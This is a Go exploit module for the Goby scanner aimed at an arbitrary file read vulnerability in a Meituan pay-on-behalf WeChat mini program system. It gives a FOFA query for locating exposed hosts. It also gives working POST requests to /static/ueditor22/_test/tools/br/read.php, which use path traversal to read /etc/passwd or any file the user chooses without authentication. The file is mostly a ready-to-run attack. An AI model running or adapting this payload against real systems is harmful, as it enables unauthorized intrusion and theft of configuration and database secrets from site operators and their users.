package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Meituan WeChat Mini Program System /read.php File Read Vulnerability",
    "Description": "<p>Meituan's WeChat Mini Program system is one of the features of an app developed by Meituan Dianping based on WeChat Mini Program technology, which allows users to easily and quickly request others to pay for their orders.With the popularity of mobile payment and the widespread application of WeChat mini programs, Meituan, as a leading local life service platform in China, has launched the payment function to meet the diverse payment needs of users.Through the WeChat Mini Program, users can easily realize the payment operation without jumping to other applications or web pages, which improves the convenience and efficiency of payment.The front desk supports shopping cart, personal center, multi-option and other functions, and the background supports promotion, agent management, dish management, point details, order management, templates, payment channel management and other functions.</p>",
    "Product": "Meituan payment WeChat applet system",
    "Homepage": "http://www.meituan.com/",
    "DisclosureDate": "2024-11-08",
    "PostTime": "2024-11-11",
    "Author": "secure_insights@163.com",
    "FofaQuery": "body=\"/h5/static/js/chunk-vendors.js\" && body=\"/static/js\"",
    "GobyQuery": "body=\"/h5/static/js/chunk-vendors.js\" && body=\"/static/js\"",
    "Level": "0",
    "Impact": "<p>There is an arbitrary file reading vulnerability in the read.php interface of the Meituan Pay WeChat Mini Program system, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to the update in time: <a href=\"http://www.meituan.com/\">http://www.meituan.com/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143630039?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "select,coustom",
            "show": ""
        },
        {
            "name": "filepath",
            "type": "select",
            "value": "/etc/passwd,/etc/security/limits.conf,/etc/hosts",
            "show": "AttackType=select"
        },
        {
            "name": "file_path",
            "type": "input",
            "value": "/etc/passwd",
            "show": "AttackType=coustom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/static/ueditor22/_test/tools/br/read.php",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "name=../../../../../../../../../etc/passwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "Vulurl|NULL|variable|{{{host}}}/static/ueditor22/_test/tools/br/read.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/static/ueditor22/_test/tools/br/read.php",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "name=../../../../../../../../..{{{file_path}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.1",
    "Translation": {
        "CN": {
            "Name": "美团代付微信小程序系统 read.php 文件读取漏洞",
            "Product": "美团代付微信小程序",
            "Description": "<p>美团代付微信小程序系统是美团点评旗下的一款基于微信小程序技术开发的应用程序功能之一，它允许用户方便快捷地请求他人为自己支付订单费用。随着移动支付的普及和微信小程序的广泛应用，美团作为中国领先的本地生活服务平台，推出了代付功能，以满足用户多样化的支付需求。通过微信小程序，用户可以轻松实现代付操作，无需跳转到其他应用或网页，提高了支付的便捷性和效率。前台支持购物车，个人中心，多选项等功能 ，后台支持推广，代理管理，菜品管理，积分明细，订单管理，模板，支付通道管理等功能。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.meituan.com/\" target=\"_blank\">http://www.meituan.com/</a><br></p>",
            "Impact": "<p>美团代付微信小程序系统 read.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Meituan WeChat Mini Program System /read.php File Read Vulnerability",
            "Product": "Meituan payment WeChat applet system",
            "Description": "<p>Meituan's WeChat Mini Program system is one of the features of an app developed by Meituan Dianping based on WeChat Mini Program technology, which allows users to easily and quickly request others to pay for their orders.With the popularity of mobile payment and the widespread application of WeChat mini programs, Meituan, as a leading local life service platform in China, has launched the payment function to meet the diverse payment needs of users.Through the WeChat Mini Program, users can easily realize the payment operation without jumping to other applications or web pages, which improves the convenience and efficiency of payment.The front desk supports shopping cart, personal center, multi-option and other functions, and the background supports promotion, agent management, dish management, point details, order management, templates, payment channel management and other functions.<br></p>",
            "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to the update in time:&nbsp;<a href=\"http://www.meituan.com/\" target=\"_blank\">http://www.meituan.com/</a><br></p>",
            "Impact": "<p>There is an arbitrary file reading vulnerability in the read.php interface of the Meituan Pay WeChat Mini Program system, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}